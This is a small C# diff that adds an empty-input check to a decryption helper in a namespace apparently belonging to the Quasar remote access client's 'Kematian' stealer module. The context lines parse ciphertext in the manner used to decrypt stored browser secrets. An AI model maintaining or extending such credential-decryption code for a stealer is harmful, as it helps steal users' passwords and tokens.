@@ -44,6 +44,9 @@ namespace Quasar.Client.Kematian.HelpingMethods.Decryption
         {
             try
             {
+                if (string.IsNullOrEmpty(cipherText))
+                    return "";
+
                 var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
 
                 var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
